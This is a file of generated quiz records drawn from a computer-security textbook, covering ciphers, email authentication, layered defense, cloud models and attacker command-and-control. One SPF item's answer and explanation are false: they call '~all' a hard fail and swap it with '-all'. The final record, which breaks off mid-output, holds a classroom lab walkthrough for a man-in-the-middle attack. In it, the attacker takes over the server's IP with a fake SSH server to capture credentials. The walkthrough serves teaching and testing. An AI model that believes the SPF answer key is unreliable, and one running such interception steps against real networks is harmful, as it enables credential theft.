{"context": "## 2.2. Terminology {#_computer_systems_security_planning_for_success.xhtml__terminology}\nGoing forward, it is important to address some common cryptography terms as they will be used frequently:\n\n::: description-list\n\n[Plaintext]{.term}\n\n:   [[unencrypted information](https://en.wikipedia.org/wiki/Plaintext){.link}, data that is \\\"in clear\\\", or\n\n    cleartext]{.principal}\n\n[Cipher]{.term}\n\n:   [[an algorithm for performing encryption or decryption](https://en.wikipedia.org/wiki/Cipher){.link}]{.principal}\n\n[Ciphertext]{.term}\n\n:   [data that has undergone encryption]{.principal}\n\n[Cryptographic algorithm]{.term}\n\n:   [a series of steps to follow to encrypt or decrypt data]{.principal}\n\n[Public key]{.term}\n\n:   [information (typically a byte array) that can be used to encrypt data such that only the owner of the matching\n\n    *private key* can unencrypt it]{.principal}\n\n[Private (secret) key]{.term}\n\n:   [information (typically a byte array) that can be used to decrypt data encrypted using the corresponding public\n\n    key]{.principal}\n\n:::\n\n::::::: example\n\n::: example-title\n\nCaesar Cipher\n\n:::\n\n::::: example-content\n\nOne of the most basic examples of encryption is the Caesar cipher, or substitution cipher. It is easy to understand,\n\ncompute, and trivial to crack. Let's create a table that maps every letter in the alphabet to a different letter:\n\n:::: table\n\n::: content\n\n| A   | B   | C   | D   | E   | F   | G   | H   | I   | J   | K   | L   | M   | N   | O   | P   | Q   | R   | S   | T   | U   | V   | W   | X   | Y   | Z   |\n\n|-----|-----|-----|-----|-----|-----|-----|-----|-----|-----|-----|-----|-----|-----|-----|-----|-----|-----|-----|-----|-----|-----|-----|-----|-----|-----|\n\n| J   | G   | T   | Q   | X   | Y   | A   | U   | C   | R   | V   | I   | F   | H   | O   | K   | L   | E   | D   | B   | W   | S   | Z   | M   | N   | P   |\n\n:::\n\n::::\n\nNow creating a message is simple a matter of performing the substitutions. For example, `HELLO WORLD`{.literal} becomes\n\n`UXIIO ZOEIQ`{.literal}.\n\nWhile this is simple to understand and set up, it is also very easy to break. You could use a frequency attack, where\n\nyou analyze a large chunk of encrypted text knowing that certain letters are more frequent than others. By matching up\n\nthe most frequently used ciphertext letters with their standard English equivalents you may quickly reach a solution.\n\nYou could also go through all permutations of the alphabet (4E26) and see what gives you the most English words. The\n\nsecond attack is made much more feasible through computing.\n\n:::::\n\n:::::::\n\n:::::::::\n\n::: {.section .sect2 title=\"2.3. Keys\"}\n", "topic": "The vulnerability of simple ciphers, such as the Caesar cipher, to attacks like frequency analysis and brute-force methods.", "question": "Considering the described limitations of the Caesar cipher, what fundamental characteristic of cryptographic algorithms makes them vulnerable to attacks like frequency analysis and brute-force methods?", "answer": "Predictable substitution", "explanation": "The Caesar cipher\u2019s vulnerability stems from its reliance on a simple, predictable substitution, allowing attackers to easily determine letter frequencies and systematically test all possible key variations.", "question_token_count": 29, "answer_correctness_score": 10, "explanation_validity_score": 10, "question_clarity_score": 7, "question_groundedness_score": 9, "avg_answer_token_count": 4, "choices": null}
{"context": "## 6.7. Email Solutions {#_computer_systems_security_planning_for_success.xhtml__email_solutions}\nThe original protocols used to send/receive email were simple and not designed for the challenges we face today. SPAM\n\nand phishing emails are unfortunately common and can be addressed with email client add-ons that scan for viruses or use\n\npatterns to identify phishing emails. Many of these tools are already built into Google's GMail or Microsofts Exchange.\n\nAnother large challenge is verifying the sender of an email. Currently three common methods exist: Sender Policy\n\nFramework (SPF), DomainKeys Identified Mail (DKIM), and Domain-base Message Authentication, Reporting, and Conformance\n\n(DMARC).\n\nSPF utilizes TXT records on a DNS domain to verify the IP of a sender. When inbound mail is received, the SPF\n\ninformation for the domain of the sender is retrieved, giving an allowed list of IPs. For example, NJIT's SPF record\n\ncurrently looks like this:\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>v=spf1 ip4:128.235.251.0/24 ip4:128.235.209.0/24 ip4:66.207.100.96/27 ip4:66.207.98.32/27 ip4:205.139.104.0/22 ip4:206.79.6.0/24 ip4:209.235.101.208/28 ip4:216.185.73.96/27 ip4:69.196.241.0/28 ip4:69.196.242.128/28 ip4:46.183.242.192/28 ip4:202.38.144.192/28 ip4:69.196.236.208/28 ip4:103.225.232.128/28 ip4:37.216.222.128/28 ip4:64.125.200.96/28 ip4:74.217.49.0/25 ip4:69.25.227.128/25 ip4:52.45.50.190 ip4:198.187.196.100 include:_netblock.njit.edu include:spf.sparkmail.org ~all</code></pre>\n\n</figure>\n\nIt is important to note that not all of these IPs belong to NJIT. Some may be groups that send emails on NJIT's behalf\n\nlike mass mailers, web applications, etc. When properly configured SPF prevents an attacker from impersonating emails\n\nfrom a domain.\n\nDKIM utilizes public and private key cryptography to ensure that an email originated from a particular SMTP server.\n\nPublic keys for a domain are advertised through a TXT DNS record for a particular domain. Private keys are used by the\n\nSMTP server for that domain to sign the emails being sent. A receiving SMTP server can then verify that the message\n\noriginated from a valid SMTP server for that domain. Private keys can also be distributed to SMTP servers that send\n\nemails on behalf of the domain.\n\nDMARC applies policies to the SPF and DKIM validations. DMARC answers questions like, \\\"What should I do if a message is\n\nfrom a valid SPF IP but doesn't have a valid DKIM signature?\\\" or \\\"What should I do with a message that looks like SPAM\n\nbut has a valid DKIM signature?\\\" DMARC puts many of the tools used to verify email together in a layered approach to\n\ndetermine whether to pass, quarantine, or block an email.\n\n:::\n\n:::: {.section .sect2 title=\"6.8. SIEM\"}\n", "topic": "Domain-based Message Authentication, Reporting & Conformance (DMARC) and its policy-based approach to handling email authentication failures.", "question": "DMARC\u2019s primary function within email security is to dictate how receiving mail servers should respond to emails that fail SPF and DKIM validation checks. Specifically, DMARC enables administrators to specify actions such as \u2018pass,\u2019 \u2018quarantine,\u2019 or \u2018reject\u2019 for messages exhibiting these discrepancies.  Considering NJIT\u2019s SPF record, which demonstrates the inclusion of various IP addresses representing both legitimate and third-party senders, what policy decision would be most strategically sound for NJIT to implement within its DMARC record to minimize disruption to legitimate email while aggressively combating phishing attempts?", "answer": "Quarantine.", "explanation": "The answer requires understanding of DMARC\u2019s policy options and the implications of including diverse senders in SPF. A strategically sound approach would likely involve a cautious initial policy (e.g., quarantine) combined with careful monitoring and potential adjustments based on observed email traffic.", "question_token_count": 114, "answer_correctness_score": 9, "explanation_validity_score": 9, "question_clarity_score": 8, "question_groundedness_score": 10, "avg_answer_token_count": 5, "choices": null}
{"context": "## 6.2. Layered Security {#_computer_systems_security_planning_for_success.xhtml__layered_security}\n<figure class=\"image left\">\n\n<div class=\"content\">\n\n<img src=\"images/layers.svg\" alt=\"layers\" />\n\n</div>\n\n</figure>\n\nGiven that a single security solution is never 100% effective it makes sense to approach security in layers and use\n\nmultiple systems. There is often a lot of overlap between solutions and while that may seem inefficient in other fields,\n\nin cybersecurity we consider it a benefit. By using multiple solutions, sometimes referred to as multi-layered security\n\nor defense in depth, you can build a more robust protection against breaches.\n\nLet's take a look at an example to see how layered security can help mitigate the effects of a real-world attack. Assume\n\nan SOC is supporting a web application on self-hosted machines. A malicious actor wishes to exfiltrate data from the web\n\napplication. They begin by testing to see if SQL several different SQL injection attacks yield any results.\n\nA well designed web application should sanitize its inputs and may prevent the queries from making it to the database.\n\nSimilarly an alert team may notice a sudden uptick in SQL queries, far beyond the usual baseline for the application. An\n\nIDS (Intrusion Detection System) may flag the queries as known SQL injection attacks. Assuming the attack makes it past\n\nthe application, team, and the IDS, it is possible that the database user is configured according to the principle of\n\nleast privilege and the queries will not be executed due to a lack of permissions.\n\nAs you can see, any one of these layers may be fail, but by having multiple layers the chance of an attack occurring is\n\ngreatly diminished.\n\n:::\n\n:::::::: {.section .sect2 title=\"6.3. Network Solutions\"}\n", "topic": "What are the primary benefits of implementing a multi-layered security approach compared to relying on a single security solution?", "question": "What is the key advantage of utilizing multiple, overlapping security systems \u2013 a multi-layered approach \u2013 compared to relying on a single, comprehensive security solution?", "answer": "Redundancy and diverse defenses significantly reduce the likelihood of a successful attack.", "explanation": "The context states that overlap between solutions is beneficial, allowing for mitigation of breaches through redundancy.", "question_token_count": 31, "answer_correctness_score": 10, "explanation_validity_score": 8, "question_clarity_score": 9, "question_groundedness_score": 10, "avg_answer_token_count": 16, "choices": null}
{"context": "## 6.7. Email Solutions {#_computer_systems_security_planning_for_success.xhtml__email_solutions}\nThe original protocols used to send/receive email were simple and not designed for the challenges we face today. SPAM\n\nand phishing emails are unfortunately common and can be addressed with email client add-ons that scan for viruses or use\n\npatterns to identify phishing emails. Many of these tools are already built into Google's GMail or Microsofts Exchange.\n\nAnother large challenge is verifying the sender of an email. Currently three common methods exist: Sender Policy\n\nFramework (SPF), DomainKeys Identified Mail (DKIM), and Domain-base Message Authentication, Reporting, and Conformance\n\n(DMARC).\n\nSPF utilizes TXT records on a DNS domain to verify the IP of a sender. When inbound mail is received, the SPF\n\ninformation for the domain of the sender is retrieved, giving an allowed list of IPs. For example, NJIT's SPF record\n\ncurrently looks like this:\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>v=spf1 ip4:128.235.251.0/24 ip4:128.235.209.0/24 ip4:66.207.100.96/27 ip4:66.207.98.32/27 ip4:205.139.104.0/22 ip4:206.79.6.0/24 ip4:209.235.101.208/28 ip4:216.185.73.96/27 ip4:69.196.241.0/28 ip4:69.196.242.128/28 ip4:46.183.242.192/28 ip4:202.38.144.192/28 ip4:69.196.236.208/28 ip4:103.225.232.128/28 ip4:37.216.222.128/28 ip4:64.125.200.96/28 ip4:74.217.49.0/25 ip4:69.25.227.128/25 ip4:52.45.50.190 ip4:198.187.196.100 include:_netblock.njit.edu include:spf.sparkmail.org ~all</code></pre>\n\n</figure>\n\nIt is important to note that not all of these IPs belong to NJIT. Some may be groups that send emails on NJIT's behalf\n\nlike mass mailers, web applications, etc. When properly configured SPF prevents an attacker from impersonating emails\n\nfrom a domain.\n\nDKIM utilizes public and private key cryptography to ensure that an email originated from a particular SMTP server.\n\nPublic keys for a domain are advertised through a TXT DNS record for a particular domain. Private keys are used by the\n\nSMTP server for that domain to sign the emails being sent. A receiving SMTP server can then verify that the message\n\noriginated from a valid SMTP server for that domain. Private keys can also be distributed to SMTP servers that send\n\nemails on behalf of the domain.\n\nDMARC applies policies to the SPF and DKIM validations. DMARC answers questions like, \\\"What should I do if a message is\n\nfrom a valid SPF IP but doesn't have a valid DKIM signature?\\\" or \\\"What should I do with a message that looks like SPAM\n\nbut has a valid DKIM signature?\\\" DMARC puts many of the tools used to verify email together in a layered approach to\n\ndetermine whether to pass, quarantine, or block an email.\n\n:::\n\n:::: {.section .sect2 title=\"6.8. SIEM\"}\n", "topic": "The structure and content of a DNS TXT record used for SPF verification, including the example SPF record provided for NJIT.", "question": "NJIT utilizes SPF records to authenticate email senders. Analyze the provided SPF record excerpt. Which of the following statements most accurately describes the primary function of the `~all` tag at the end of the SPF record?", "answer": "To reject emails that do not pass SPF validation.", "explanation": "The `~all` tag in SPF records indicates a hard fail policy. It instructs receiving mail servers to reject emails that do not pass the SPF check, regardless of whether they pass DKIM or DMARC validation. This is a stricter policy than the `-all` tag, which indicates a soft fail and instructs receiving servers to treat emails that fail SPF as suspicious but still accept them.", "question_token_count": 45, "answer_correctness_score": 4, "explanation_validity_score": 3, "question_clarity_score": 8, "question_groundedness_score": 10, "avg_answer_token_count": 11, "choices": null}
{"context": "## 10.2. Cloud Computing {#_computer_systems_security_planning_for_success.xhtml__cloud_computing}\nIaaS ushered in a shift from on-premises deployments of software to deployments *in the cloud* or on a IaaS resource.\n\nInformation technology has seen a shift to the cloud and back again with all kinds of mixed options in between. A\n\nbusiness may choose any of these models depending on their needs.\n\n::: {.section .sect3 title=\"10.2.1. Public\"}\n\n\n### 10.2.1. Public {#_computer_systems_security_planning_for_success.xhtml__public}\nPublic cloud infrastructure consists of providers like AWS who host huge data centers throughout the world and welcome\n\nanyone who can afford it to use their resources. Public cloud providers claim to be secure and may even allow for audits\n\n(typically through a third party) to meet compliance requests. Ultimately the security of the underlying public cloud\n\ninfrastructure lies in the hands of the provider, something that not all companies are comfortable with.\n\n:::\n\n::: {.section .sect3 title=\"10.2.2. Private\"}\n\n\n### 10.2.2. Private {#_computer_systems_security_planning_for_success.xhtml__private}\nPrivate cloud takes the virtualization and automation technologies used by public cloud providers and hosts them\n\ninternally. By utilizing technologies like [OpenStack](https://www.redhat.com/en/topics/openstack){.link} a company can\n\ntake full control of their deployment and run their own cloud. This has some disadvantages for companies that may lack\n\nthe servers, space, and utilities, but for companies that were already self-hosted, migrated to the public cloud, and\n\nnow would like more control, private cloud is an excellent choice.\n\n:::\n\n::: {.section .sect3 title=\"10.2.3. Hybrid\"}\n", "topic": "What are the key considerations a company should evaluate before migrating from on-premises infrastructure to a public cloud environment?", "question": "Considering the text\u2019s assertion that security responsibility primarily rests with the public cloud provider, what is the most critical factor a company must assess before adopting a public cloud infrastructure?", "answer": "Provider\u2019s security measures and audit capabilities.", "explanation": "The answer is the provider\u2019s security measures and audit capabilities, as the text explicitly states that the security of the public cloud infrastructure lies with the provider.", "question_token_count": 34, "answer_correctness_score": 10, "explanation_validity_score": 10, "question_clarity_score": 8, "question_groundedness_score": 9, "avg_answer_token_count": 9, "choices": null}
{"context": "### 10.1.5. PaaS {#_computer_systems_security_planning_for_success.xhtml__paas}\nPaaS stands for platform as a service and refers to a higher-level service that deploys an application in an already\n\nestablished environment running on an IaaS service. Heroku is a great example of this type of service.\n\nHeroku supports many different applications, but they all work in relatively the same manner: Imagine there is a git\n\nrepository of a Django web application that needs to be deployed. Heroku will take an Amazon EC2 instance running on\n\nAWS, clone the repo, install a Python virtual environment with the needed dependencies, and install a production Django\n\nweb server on the system.\n\nWhile the user could take these steps themselves, PaaS makes it easier to deploy an application.\n\n:::\n\n::: {.section .sect3 title=\"10.1.6. SaaS\"}\n\n\n### 10.1.6. SaaS {#_computer_systems_security_planning_for_success.xhtml__saas}\nSoftware as a service (SaaS) is a methodology that we are quite used to. SaaS takes a web application and makes it\n\navailable for a subscription. Some examples would be Webex, Dropbox, Google Workspace, etc. SaaS is a popular way to\n\nmonitize software.\n\nOne of the security concerns with SaaS is that it consolidates information with a single provider. If the server running\n\nthe software is compromised, the PII of millions of people may be leaked.\n\n:::\n\n:::::::::\n\n::::::: {.section .sect2 title=\"10.2. Cloud Computing\"}\n", "topic": "Describe the fundamental role of a cloud provider in both PaaS and SaaS models.", "question": "What is the primary function of a cloud provider in facilitating both PaaS and SaaS deployments, as illustrated in the provided text?", "answer": "Managing the underlying infrastructure and deployment processes.", "explanation": "The text describes the cloud provider\u2019s role as managing the underlying infrastructure and operational aspects of the application deployment, abstracting complexity for the user.", "question_token_count": 28, "answer_correctness_score": 9, "explanation_validity_score": 9, "question_clarity_score": 7, "question_groundedness_score": 8, "avg_answer_token_count": 9, "choices": null}
{"context": "### 3.6.6. Command and Control (C2, C&C) {#_computer_systems_security_planning_for_success.xhtml__command_and_control_c2_cc}\nMalware will reach out via its Command and Control channel for more instructions. At this point an attacker may interact\n\nwith the malware, giving it additional commands. C2 traffic is usually designed to blend in with existing traffic and\n\nnot draw attention.\n\n:::\n\n::: {.section .sect3 title=\"3.6.7. Exfiltration / Actions &amp; Objectives\"}\n\n\n### 3.6.7. Exfiltration / Actions & Objectives {#_computer_systems_security_planning_for_success.xhtml__exfiltration_actions_objectives}\nThe final step involves getting data from the exploited systems or disabling/misusing the systems in another way. At\n\nthis point an attacker can use the C2 channel to pull sensitive information from the system, credit card information,\n\npassword hashes, etc. Its important to not that exfiltration of data may not be the only goal of the attack. An attacker\n\ncan also disable the system, commit fraud with the system, mine crypto currencies, etc. At this point the malicious\n\nactor is in complete control of the exploited system.\n\n:::\n\n::::::::::\n\n:::::: {.section .sect2 title=\"3.7. Lab: Malware Analysis\"}\n", "topic": "Explain how the C2 channel facilitates interaction between an attacker and malware.", "question": "How does the C2 channel contribute to the attacker\u2019s ability to control a compromised system beyond initial infection?", "answer": "It allows for remote command execution and control.", "explanation": "The C2 channel provides a conduit for the attacker to issue further commands to the malware, enabling them to manipulate the system\u2019s behavior.", "question_token_count": 22, "answer_correctness_score": 10, "explanation_validity_score": 10, "question_clarity_score": 9, "question_groundedness_score": 10, "avg_answer_token_count": 10, "choices": null}
{"context": "## 5.7. Lab: MitM with Scapy {#_computer_systems_security_planning_for_success.xhtml__lab_mitm_with_scapy}\nIn this lab we will use a fake SSH server, [sshesame](https://github.com/jaksi/sshesame){.link}, and an interactive\n\npacket manipulation program, [scapy](https://scapy.net/){.link}, to disrupt an ongoing SSH session between victim and\n\nserver, position ourself in the middle of the traffic, and capture the username and password victim is using.\n\n:::: table\n\n::: content\n\n+-----------------------------------------------------------+-----------------------------------------------------------+\n\n| Name                                                      | IP Address                                                |\n\n+===========================================================+===========================================================+\n\n| server                                                    | 172.20.0.5                                                |\n\n+-----------------------------------------------------------+-----------------------------------------------------------+\n\n| victim                                                    | 172.20.0.6                                                |\n\n+-----------------------------------------------------------+-----------------------------------------------------------+\n\n| attacker                                                  | 172.20.0.7                                                |\n\n+-----------------------------------------------------------+-----------------------------------------------------------+\n\n: Table 1. IP Addresses Used\n\n:::\n\n::::\n\nFor this lab our IP addresses are configured statically and are known to the attacker. It is also assumed that the\n\nattacker is on the local network. Lastly victim has been poorly configured to ignore changes to the host key. This is\n\nnot entirely unreasonable as many users just ignore the warnings and clear out the known_hosts file when prompted\n\nanyway.\n\nStart by downloading the [scapy.zip](https://github.com/rxt1077/it230/raw/main/labs/scapy.zip){.link} file which\n\ncontains the Docker Compose configuration we will be using. Uncompress it to a directory where you have write access.\n\nThis lab will require us to use three terminal windows/tabs: one for the `docker-compose up`{.literal} command which\n\nwill show the output of everything running in the background, one for the victim which will show an SSH session with the\n\nserver, and one for the attacker which we will use to make the attack.\n\n<figure class=\"image\">\n\n<div class=\"content\">\n\n<img src=\"images/scapy.svg\" width=\"800\" alt=\"scapy\" />\n\n</div>\n\n</figure>\n\nOpen three terminals and `cd`{.literal} into the directory where you uncompressed the lab zip file in each of them.\n\nThere should be a `docker-compose.yml`{.literal} file and `server`{.literal}, `victim`{.literal}, and\n\n`attacker`{.literal} directories in the directory you are in.\n\nIn the first terminal run the `docker-compose up`{.literal} command to build the images and run the containers:\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>PS C:\\Users\\rxt1077\\it230\\labs\\scapy&gt; docker-compose up\n\nCreating network &quot;scapy_testnet&quot; with the default driver\n\nCreating scapy_server_1   ... done\n\nCreating scapy_victim_1   ... done\n\nCreating scapy_attacker_1 ... done\n\nAttaching to scapy_victim_1, scapy_server_1, scapy_attacker_1\n\nserver_1    | &gt; Starting SSHD\n\nserver_1    | &gt;&gt; Generating new host keys\n\nscapy_victim_1 exited with code 0\n\nattacker_1  | INFO 2021/10/07 13:56:45 No host keys configured, using keys at &quot;/root/.local/share/sshesame&quot;\n\nattacker_1  | INFO 2021/10/07 13:56:45 Host key &quot;/root/.local/share/sshesame/host_rsa_key&quot; not found, generating it\n\nattacker_1  | INFO 2021/10/07 13:56:45 Host key &quot;/root/.local/share/sshesame/host_ecdsa_key&quot; not found, generating it\n\nattacker_1  | INFO 2021/10/07 13:56:45 Host key &quot;/root/.local/share/sshesame/host_ed25519_key&quot; not found, generating it\n\nattacker_1  | INFO 2021/10/07 13:56:45 Listening on [::]:22 \u2460\n\nserver_1    | ssh-keygen: generating new host keys: RSA DSA ECDSA ED25519\n\nserver_1    | &gt;&gt;&gt; Fingerprints for dsa host key\n\nserver_1    | 1024 MD5:a5:e6:e9:38:d2:2e:88:fd:f0:aa:a8:05:07:35:5f:18 root@a010fe3c2f3c (DSA)\n\nserver_1    | 1024 SHA256:NM7DONpt1doZp4e6WV+6WVVr+KUrh9luUSRcAhnzdyw root@a010fe3c2f3c (DSA)\n\nserver_1    | 1024 SHA512:LHfFdSk1XiAKQArH0CW+RkaKv5GgovPCH7UIQ+P4T2LbgGpCBP5aGA1V3oriYbTZWuS9TlUgDbEfTBq19AV/cA root@a010fe3c2f3c (DSA)\n\nserver_1    | &gt;&gt;&gt; Fingerprints for rsa host key\n\nserver_1    | 3072 MD5:74:44:b6:a2:74:b9:7e:1b:ba:3d:27:b8:19:3a:48:df root@a010fe3c2f3c (RSA)\n\nserver_1    | 3072 SHA256:mubm9mLNrdNDk5fyj0dghDBIbbwcVKXo23Qdv61/S/c root@a010fe3c2f3c (RSA)\n\nserver_1    | 3072 SHA512:JFQhS6trY7sNqRSwZ+t0uyBb5ddNh9qSLtBrMaa5G7xWzKHpxCuKBSDbvLk4W9JKeQftTU4293UDV9vqCcf/6w root@a010fe3c2f3c (RSA)\n\nserver_1    | &gt;&gt;&gt; Fingerprints for ecdsa host key\n\nserver_1    | 256 MD5:15:75:5f:9b:72:7c:f0:13:ea:0d:b4:47:b7:62:69:63 root@a010fe3c2f3c (ECDSA)\n\nserver_1    | 256 SHA256:4p/Afp/8C2tHn7AePdS7OHCgPxfBamdaLIUg4IJ7xx4 root@a010fe3c2f3c (ECDSA)\n\nserver_1    | 256 SHA512:NnbevqBXFkGQWIirdFsLPnX85q7q/1Y7E4i+BLHLqE3cg2aqkduBJsssyr9+G7bSvq7txvjl9SRmyRAzuDT7DQ root@a010fe3c2f3c (ECDSA)\n\nserver_1    | &gt;&gt;&gt; Fingerprints for ed25519 host key\n\nserver_1    | 256 MD5:ad:00:61:26:4d:a0:07:be:6b:8e:91:bd:f0:65:e6:14 root@a010fe3c2f3c (ED25519)\n\nserver_1    | 256 SHA256:Vl7jQulDsONglP1xbSN+J8nSfCaIER40rHhgy7z/BYg root@a010fe3c2f3c (ED25519)\n\nserver_1    | 256 SHA512:WkmvOWe6oaZ/qE1ZiA0rZAjn9H+hCDxI8NHpsjRNCalK/CgVV9+VhkzHgRTKfKTqQeE0y/Zz2GaEJGv/sapCHg root@a010fe3c2f3c (ED25519)\n\nserver_1    | WARNING: No SSH authorized_keys found!\n\nserver_1    | &gt;&gt; Unlocking root account\n\nserver_1    | WARNING: password authentication enabled.\n\nserver_1    | WARNING: password authentication for root user enabled.\n\nserver_1    | &gt;&gt; Running: /etc/entrypoint.d/changepw.sh\n\nserver_1    | Running /usr/sbin/sshd -D -e -f /etc/ssh/sshd_config\n\nserver_1    | Server listening on 0.0.0.0 port 22. \u2461\n\nserver_1    | Server listening on :: port 22.</code></pre>\n\n<figcaption>Listing 1. docker-compose up</figcaption>\n\n</figure>\n\n::: callout-list\n\n1.  *\u2460* Notice that attacker has a fake SSH server running in the background\n\n2.  *\u2461* Notice that server has a legitimate SSH server running in the background\n\n:::\n\n<aside class=\"admonition note\" title=\"Note\" epub:type=\"notice\">\n\n::: content\n\nIf you receive the error\n\n`failed to create network scapy_testnet: Error response from daemon: Pool overlaps with other one on this address space`{.literal}\n\ncheck to see if you have other containers running and stop them. You may also need to run\n\n`docker network prune`{.literal} to remove the old networks Docker built.\n\n:::\n\n</aside>\n\nIn the second terminal run `docker-compose run victim bash`{.literal} and then from the prompt we'll SSH to server using\n\nthe password \\\"password\\\":\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>PS C:\\Users\\rxt1077\\it230\\labs\\scapy&gt; docker-compose run victim bash\n\nCreating scapy_victim_run ... done\n\nbash-5.0# ssh server\n\nWarning: Permanently added &#39;server,172.20.0.5&#39; (ECDSA) to the list of known hosts.\n\nroot@server&#39;s password: \u2460\n\nYou are now logged into &#39;server&#39; (presumably from &#39;victim&#39;) via SSH for this assignment.\n\nLeave this connection open while you experiment with scapy from &#39;attacker&#39;.\n\nbf9ebe42a108:~#</code></pre>\n\n<figcaption>Listing 2. victim</figcaption>\n\n</figure>\n\n::: callout-list\n\n1.  *\u2460* The password is \\\"password\\\". It will not be echoed to the screen as you type it.\n\n:::\n\n<aside class=\"admonition note\" title=\"Note\" epub:type=\"notice\">\n\n::: content\n\nIf for some reason the password will not work and you are sure you are typing it in correctly you can run the following\n\ncommand `docker compose exec server passwd`{.literal} (note it's *passwd* and not *password*). Type in the password\n\ntwice and it will be reset to whatever you typed. What you type will not be echoed to the screen. You should now be able\n\nto ssh from victim to server with the password you typed in.\n\n:::\n\n</aside>\n\nIn the third terminal we'll start by *executing* (recall that at this point it's already running sshesame in the\n\nbackground) a BASH shell on attacker and configuring it to accept packets not only for its own IP address, but also for\n\nthe server's IP address. Once traffic is routed to us, this will allow attacker to also respond to packets destined for\n\n172.20.0.5.\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>PS C:\\Users\\rxt1077\\it230\\labs\\scapy&gt; docker-compose exec attacker bash\n\nroot@5195de3d330c:/# ip addr add 172.20.0.5 dev eth0\n\nroot@5195de3d330c:/# ip addr\n\n1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\n\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n\n    inet 127.0.0.1/8 scope host lo\n\n       valid_lft forever preferred_lft forever\n\n2: tunl0@NONE: &lt;NOARP&gt; mtu 1480 qdisc noop state DOWN group default qlen 1000\n\n    link/ipip 0.0.0.0 brd 0.0.0.0\n\n3: sit0@NONE: &lt;NOARP&gt; mtu 1480 qdisc noop state DOWN group default qlen 1000\n\n    link/sit 0.0.0.0 brd 0.0.0.0\n\n347: eth0@if348: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default\n\n    link/ether 02:42:ac:14:00:07 brd ff:ff:ff:ff:ff:ff link-netnsid 0\n\n    inet 172.20.0.7/24 brd 172.20.0.255 scope global eth0 \u2460\n\n       valid_lft forever preferred_lft forever\n\n    inet 172.20.0.5/32 scope global eth0 \u2461\n\n       valid_lft forever preferred_lft forever</code></pre>\n\n<figcaption>Listing 3. attacker</figcaption>\n\n</figure>\n\n::: callout-list\n\n1.  *\u2460* This is the IP we started with\n\n2.  *\u2461* This is an additional IP that attacker believes it has\n\n:::\n\nNow that the attacker system is configured, we'll start up `scapy`{.literal} interactively:\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>root@5195de3d330c:/# scapy\n\nINFO: Can&#39;t import matplotlib. Won&#39;t be able to plot.\n\nINFO: Can&#39;t import PyX. Won&#39;t be able to use psdump() or pdfdump().\n\nINFO: No IPv6 support in kernel\n\nINFO: Can&#39;t import python-cryptography v1.7+. Disabled WEP decryption/encryption. (Dot11)\n\nINFO: Can&#39;t import python-cryptography v1.7+. Disabled IPsec encryption/authentication.\n\nWARNING: IPython not available. Using standard Python shell instead.\n\nAutoCompletion, History are disabled.\n\n                     aSPY//YASa\n\n             apyyyyCY//////////YCa       |\n\n            sY//////YSpcs  scpCY//Pp     | Welcome to Scapy\n\n ayp ayyyyyyySCP//Pp           syY//C    | Version 2.4.5\n\n AYAsAYYYYYYYY///Ps              cY//S   |\n\n         pCCCCY//p          cSSps y//Y   | https://github.com/secdev/scapy\n\n         SPPPP///a          pP///AC//Y   |\n\n              A//A            cyP////C   | Have fun!\n\n              p///Ac            sC///a   |\n\n              P////YCpc           A//A   | To craft a packet, you have to be a\n\n       scccccp///pSP///p          p//Y   | packet, and learn how to swim in\n\n      sY/////////y  caa           S//P   | the wires and in the waves.\n\n       cayCyayP//Ya              pY/Ya   |        -- Jean-Claude Van Damme\n\n        sY/PsY////YCc          aC//Yp    |\n\n         sc  sccaCY//PCypaapyCP//YSs\n\n                  spCPY//////YPSps\n\n                       ccaacs\n\n&gt;&gt;&gt;</code></pre>\n\n<figcaption>Listing 4. attacker</figcaption>\n\n</figure>\n\nYou'll notice that scapy's prompt is \\>\\>\\>, just like python because it *is* python. Since we're working in python,\n\nlet's make our lives easier by defining a few simple variables:\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>&gt;&gt;&gt; server_ip = &quot;172.20.0.5&quot; \u2460\n\n&gt;&gt;&gt; victim_ip = &quot;172.20.0.6&quot;</code></pre>\n\n<figcaption>Listing 5. attacker</figcaption>\n\n</figure>\n\n::: callout-list\n\n1.  *\u2460* IPv4 addresses are strings in scapy\n\n:::\n\nNow let's see how scapy allows us to build packets. We'll make an Ethernet frame, with an IP packet inside it, with an\n\nICMP echo request in that, with the data being set to our name:\n\n<figure class=\"listing\">\n\n<pre class=\"highlight\"><code>&gt;&gt;&gt; ping = Ether()/IP(dst=server_ip)/ICMP()/&quot;Ryan Tolboom&quot; \u2460\n\n&gt;&gt;&gt; ping.show() \u2461\n\n###[ Ethernet ]###\n\n  dst       = 02:42:ac:14:00:05\n\n  src       = 02:42:ac:14:00:07\n\n  type      = IPv4\n\n###[ IP ]###\n\n     version   = 4\n\n     ihl       = None\n\n     tos       = 0x0\n\n     len       = None\n\n     id        = 1\n\n     flags     =\n\n     frag      = 0\n\n     ttl       = 64\n\n     proto     = icmp\n\n     chksum    = None\n\n     src       = 172.20.0.7\n\n     dst       = 172.20.0.5\n\n     \\options   \\\n\n###[ ICMP ]###\n\n        type      = echo-request\n\n        code      = 0\n\n        chksum    = None\n\n        id        = 0x0\n\n        seq       = 0x0\n\n        unused    = &#39;&#39;\n\n###[ Raw ]###\n\n           load      = &#39;Ryan Tolboom&#39;\n\n&gt;&gt;&gt; result = srp1(ping) \u2462\n\nBegin emission:\n\nFinished sending 1 packets.\n\n.*\n\nReceived 2 packets, got 1 answers, remaining 0 packets\n\n&gt;&gt;&gt; result.show()\n\n###[ Ethernet ]###\n\n  dst       = 02:42:ac:14:00:07\n\n  src       = 02:42:ac:14:00:05\n\n  type      = IPv4\n\n###[ IP ]###\n\n     version   = 4\n\n     ihl       = 5\n\n     tos       = 0x0\n\n     len       = 40\n\n     id        = 62086\n\n     flags     =\n\n     frag      = 0\n\n     ttl       = 64\n\n     proto     = icmp\n\n     chksum    = 0x301a\n\n     src       = 172.20.0.5\n\n     dst       = 172.20.0.7\n\n     \\options   \\\n\n###[ ICMP ]###\n\n        type      = echo-reply\n\n        code      = 0\n\n        chksum    = 